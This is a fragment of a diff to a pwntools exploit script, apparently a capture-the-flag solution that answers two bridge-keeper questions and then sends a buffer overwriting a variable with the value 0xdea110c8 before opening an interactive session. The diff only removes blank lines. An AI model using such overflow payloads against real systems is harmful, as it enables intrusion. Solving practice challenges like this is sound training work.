@@ -7,7 +7,6 @@ b *main+305
 b *main+310
 ''')
 
-
 answer1 = "Sir Lancelot of Camelot"
 answer2 = "To seek the Holy Grail."
 flag = 0xdea110c8
@@ -19,5 +18,4 @@ buf += p32(flag)
 p.sendline(answer1)
 p.sendline(answer2)
 p.sendline(buf)
-
 p.interactive()
